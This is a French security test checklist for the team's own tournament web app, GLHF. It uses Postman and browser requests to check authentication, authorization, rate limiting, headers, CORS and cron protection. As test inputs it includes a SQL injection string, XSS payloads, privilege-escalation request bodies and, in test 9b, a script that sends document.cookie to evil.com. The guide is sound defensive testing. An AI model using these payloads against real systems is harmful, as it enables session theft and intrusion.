# Tests de Sécurité GLHF — Guide Postman / Navigateur

> Remplace `{{URL}}` par ton URL Vercel (ex: `https://glhf-xxx.vercel.app`).
> Pour les requêtes authentifiées, récupère le cookie de session depuis le navigateur (F12 → Application → Cookies → copie `authjs.session-token`).

---

## 0. Prérequis — Récupérer le cookie de session

1. Connecte-toi normalement sur le site
2. F12 → onglet **Application** → **Cookies** → copie la valeur de `authjs.session-token`
3. Dans Postman, ajoute un header : `Cookie: authjs.session-token=<valeur_copiée>`

> Pour les tests "sans auth", n'envoie simplement pas ce header.

---

## 1. AUTH — Injection SQL sur le login

**But :** Vérifier que Prisma paramétrise les requêtes.

**Requête Postman :**
```
POST {{URL}}/api/auth/callback/credentials
Content-Type: application/x-www-form-urlencoded

email=' OR 1=1 --&password=nimportequoi&csrfToken=xxx
```

**Résultat attendu :** Erreur d'authentification classique, PAS d'accès. La tentative est traitée comme du texte brut par Prisma.

**Sur le front :** Va sur `/signin`, tape `' OR 1=1 --` dans le champ email et un mot de passe random → erreur "Identifiants invalides".

---

## 2. AUTH — Brute force / Rate limiting

**But :** Vérifier le blocage après 5 tentatives.

**Requête Postman (répète 6 fois) :**
```
POST {{URL}}/api/auth/callback/credentials
Content-Type: application/x-www-form-urlencoded

email=un-vrai-email@test.com&password=mauvaismdp&csrfToken=xxx
```

**Résultat attendu :**
- Tentatives 1 à 5 : erreur "Identifiants invalides"
- Tentative 6 : **"Trop de tentatives. Réessayez dans X minutes."** (blocage 15 min)

**Sur le front :** Va sur `/signin`, tape 6 fois le mauvais mot de passe → le message de blocage apparaît.

---

## 3. AUTH — Inscription avec données invalides

**But :** Vérifier la validation Zod côté serveur.

### 3a. Mot de passe trop court
```
POST {{URL}}/api/auth/signup
Content-Type: application/json

{
  "pseudo": "TestHacker",
  "email": "hacker@test.com",
  "password": "short"
}
```
**Résultat attendu :** 400 — mot de passe doit faire au moins 12 caractères.

### 3b. Pseudo avec caractères spéciaux
```
POST {{URL}}/api/auth/signup
Content-Type: application/json

{
  "pseudo": "<script>alert('xss')</script>",
  "email": "hacker@test.com", 
  "password": "MonSuperMdp123!"
}
```
**Résultat attendu :** 400 — pseudo ne matche pas la regex `^[a-zA-Z0-9._-]{3,20}$`.

### 3c. Email invalide
```
POST {{URL}}/api/auth/signup
Content-Type: application/json

{
  "pseudo": "TestUser",
  "email": "pas-un-email",
  "password": "MonSuperMdp123!"
}
```
**Résultat attendu :** 400 — format email invalide.

### 3d. Mot de passe sans complexité (12 chars mais pas 3 catégories)
```
POST {{URL}}/api/auth/signup
Content-Type: application/json

{
  "pseudo": "TestUser2",
  "email": "test2@test.com",
  "password": "aaaaaaaaaaaa"
}
```
**Résultat attendu :** 400 — doit contenir au moins 3 catégories parmi : minuscule, majuscule, chiffre, spécial.

---

## 4. AUTORISATION — Accès admin sans le rôle

**But :** Vérifier qu'un USER ne peut pas accéder aux routes admin.

**Connecte-toi avec un compte USER normal, récupère le cookie.**

### 4a. Lister les utilisateurs (admin)
```
GET {{URL}}/api/admin/users/search?query=
Cookie: authjs.session-token=<cookie_USER>
```
**Résultat attendu :** 403 Forbidden ou redirection vers une page d'erreur.

### 4b. Changer le rôle d'un utilisateur
```
POST {{URL}}/api/admin/users/1/toggle-role
Cookie: authjs.session-token=<cookie_USER>
```
**Résultat attendu :** 403 ou redirection forbidden.

### 4c. Supprimer un utilisateur
```
POST {{URL}}/api/admin/users/1/toggle-delete
Cookie: authjs.session-token=<cookie_USER>
```
**Résultat attendu :** 403 ou redirection forbidden.

**Sur le front :** Connecté en USER, tape directement `{{URL}}/admin` dans la barre d'adresse → redirection ou page "accès refusé".

---

## 5. AUTORISATION — Sans authentification du tout

**But :** Vérifier que TOUTES les routes protégées renvoient 401.

```
GET {{URL}}/api/user/tokens
(pas de cookie)
```
**Résultat attendu :** 401 "Non autorisé"

```
POST {{URL}}/api/tournament/create
Content-Type: multipart/form-data
(pas de cookie)
```
**Résultat attendu :** 401 "Non autorisé"

```
GET {{URL}}/api/admin/payments
(pas de cookie)
```
**Résultat attendu :** 401 ou redirection (pas d'accès aux données).

---

## 6. TOKENS — Rejoindre un tournoi sans tokens

**But :** Vérifier le blocage serveur quand 0 tokens restants.

**Prérequis :** Utilise un compte qui a déjà épuisé ses tokens (rejoint 3 tournois avec le plan gratuit).

```
POST {{URL}}/api/tournament/<ID_TOURNOI>/join
Content-Type: application/json
Cookie: authjs.session-token=<cookie>

{ "action": "join" }
```
**Résultat attendu :** 403 — "Tu as utilisé tous tes tokens ce mois-ci"

**Sur le front :** Le bouton "Rejoindre" devrait être désactivé, mais même si tu forces l'appel API manuellement, le serveur bloque.

---

## 7. TOKENS — Manipulation directe des tokens

**But :** Vérifier qu'on ne peut PAS modifier ses tokens via l'API.

```
PATCH {{URL}}/api/user
Content-Type: application/json
Cookie: authjs.session-token=<cookie>

{
  "tokensUsedThisMonth": 0,
  "tokensPerMonth": 999,
  "role": "SUPER_ADMIN"
}
```
**Résultat attendu :** La route `/api/user` n'accepte que GET → **405 Method Not Allowed** ou ignore les champs. Aucun champ sensible (tokens, rôle) ne peut être modifié par l'utilisateur.

---

## 8. TOURNOI — Modifier un match sans être le créateur

**But :** Vérifier qu'un joueur lambda ne peut pas déclarer un vainqueur.

**Connecte-toi avec un compte qui n'est PAS le créateur du tournoi.**

```
POST {{URL}}/api/match/update
Content-Type: application/json
Cookie: authjs.session-token=<cookie_joueur>

{
  "tournamentId": 1,
  "round": 0,
  "matchIndex": 0,
  "winnerId": 42
}
```
**Résultat attendu :** 403 — seul le créateur du tournoi peut déclarer les vainqueurs.

---

## 9. INJECTION — XSS dans les formulaires

**But :** Vérifier que le HTML/JS est échappé.

### 9a. Nom de tournoi avec script
**Sur le front :** Crée un tournoi avec le nom :
```
<img src=x onerror=alert('XSS')>
```
**Résultat attendu :** Le texte s'affiche en brut, aucune exécution de code. React échappe automatiquement via JSX.

### 9b. Message de contact avec HTML
```
POST {{URL}}/api/contact
Content-Type: application/json
Cookie: authjs.session-token=<cookie>

{
  "message": "<script>document.location='https://evil.com/steal?c='+document.cookie</script>"
}
```
**Résultat attendu :** Le message est stocké comme du texte brut. Les emails utilisent `escapeHtml()`. Aucune exécution dans le navigateur.

---

## 10. CONTACT — Rate limiting (5 messages/jour)

**But :** Vérifier le rate limiting du formulaire de contact.

**Envoie 6 messages rapidement :**
```
POST {{URL}}/api/contact
Content-Type: application/json
Cookie: authjs.session-token=<cookie>

{ "message": "Test rate limit message numéro X" }
```
**Résultat attendu :** Messages 1-5 passent → message 6 : **429 "Limite atteinte"**

---

## 11. HEADERS — Vérification des en-têtes de sécurité

**But :** Vérifier les 6 en-têtes de sécurité sur n'importe quelle page.

```
GET {{URL}}/
```

**Résultat attendu dans les Response Headers :**

| Header | Valeur attendue |
|---|---|
| `content-security-policy` | Contient `default-src 'self'`, `frame-ancestors 'none'` |
| `x-frame-options` | `DENY` |
| `x-content-type-options` | `nosniff` |
| `strict-transport-security` | `max-age=63072000; includeSubDomains; preload` |
| `referrer-policy` | `no-referrer` |
| `permissions-policy` | `camera=(), microphone=(), geolocation=()` |

**Sur le front :** F12 → Network → clique sur la première requête → onglet Headers → Response Headers.

---

## 12. CORS — Requête cross-origin

**But :** Vérifier que l'API rejette les appels d'origines non autorisées.

**Dans la console du navigateur sur un autre site (ex: google.com), tape :**
```js
fetch('{{URL}}/api/user/tokens', { credentials: 'include' })
  .then(r => r.json()).then(console.log).catch(console.error)
```
**Résultat attendu :** Erreur CORS — `Access-Control-Allow-Origin` ne matche pas l'origine de Google.

---

## 13. CRON — Appeler le reset tokens sans secret

**But :** Vérifier la protection du cron job.

### 13a. Sans header
```
GET {{URL}}/api/cron/reset-tokens
```
**Résultat attendu :** 401 "Non autorisé"

### 13b. Avec un faux secret
```
GET {{URL}}/api/cron/reset-tokens
Authorization: Bearer fake-secret-123
```
**Résultat attendu :** 401 "Non autorisé"

---

## 14. SOFT DELETE — Connexion avec un compte supprimé

**But :** Vérifier qu'un compte soft-deleted ne peut plus se connecter.

1. En admin, soft-delete un compte de test (isDeleted = true)
2. Essaie de te connecter avec ce compte sur `/signin`

**Résultat attendu :** Échec de connexion — le callback JWT vérifie `isDeleted` et refuse.

---

## 15. IDOR — Accéder au profil d'un autre utilisateur via l'API

**But :** Vérifier qu'on ne peut pas modifier les données d'un autre utilisateur.

```
POST {{URL}}/api/admin/users/999/update
Content-Type: application/json
Cookie: authjs.session-token=<cookie_USER_normal>

{ "pseudo": "hacked", "role": "SUPER_ADMIN" }
```
**Résultat attendu :** 403 — seuls les admins peuvent modifier d'autres utilisateurs.

---

## 16. SUPER_ADMIN — Tentative de rétrogradation

**But :** Vérifier qu'un ADMIN ne peut pas rétrograder un SUPER_ADMIN.

**Connecte-toi avec un compte ADMIN (pas SUPER_ADMIN).**

```
POST {{URL}}/api/admin/users/<ID_SUPER_ADMIN>/toggle-role
Cookie: authjs.session-token=<cookie_ADMIN>
```
**Résultat attendu :** Refusé — "Vous ne pouvez pas modifier un SUPER_ADMIN".

---

## 17. TOURNOI — Double inscription

**But :** Vérifier qu'on ne peut pas rejoindre 2 fois le même tournoi (et perdre 2 tokens).

```
POST {{URL}}/api/tournament/<ID>/join
Content-Type: application/json
Cookie: authjs.session-token=<cookie>

{ "action": "join" }
```
**(Envoie 2 fois de suite rapidement)**

**Résultat attendu :** La 2ème requête retourne `success: true` sans consommer de token supplémentaire (détection du doublon via `existingParticipation?.isActive`).

---

## 18. TOURNOI — Rejoindre un tournoi complet

**But :** Vérifier le blocage quand maxPlayers est atteint.

**Trouve un tournoi qui a déjà atteint son max de joueurs.**

```
POST {{URL}}/api/tournament/<ID_COMPLET>/join
Content-Type: application/json
Cookie: authjs.session-token=<cookie>

{ "action": "join" }
```
**Résultat attendu :** Erreur — "Tournoi complet".

---

## Résumé des résultats à documenter

| # | Test | Résultat attendu | ✅/❌ |
|---|---|---|---|
| 1 | Injection SQL login | Bloqué par Prisma | |
| 2 | Brute force login (6 tentatives) | Bloqué après 5 | |
| 3a | MDP trop court | 400 | |
| 3b | Pseudo XSS | 400 regex | |
| 3c | Email invalide | 400 | |
| 3d | MDP sans complexité | 400 | |
| 4 | Routes admin en USER | 403 | |
| 5 | Routes sans auth | 401 | |
| 6 | Join sans tokens | 403 | |
| 7 | Modifier ses tokens | 405 / ignoré | |
| 8 | Déclarer vainqueur (pas créateur) | 403 | |
| 9a | XSS nom tournoi | Texte brut | |
| 9b | XSS contact | Échappé | |
| 10 | Contact rate limit (6 msgs) | 429 au 6ème | |
| 11 | Headers de sécurité | 6 headers présents | |
| 12 | CORS cross-origin | Bloqué | |
| 13 | Cron sans secret | 401 | |
| 14 | Login compte supprimé | Refusé | |
| 15 | IDOR modification autre user | 403 | |
| 16 | Rétrograder SUPER_ADMIN | Refusé | |
| 17 | Double inscription tournoi | Pas de double token | |
| 18 | Rejoindre tournoi complet | Bloqué | |
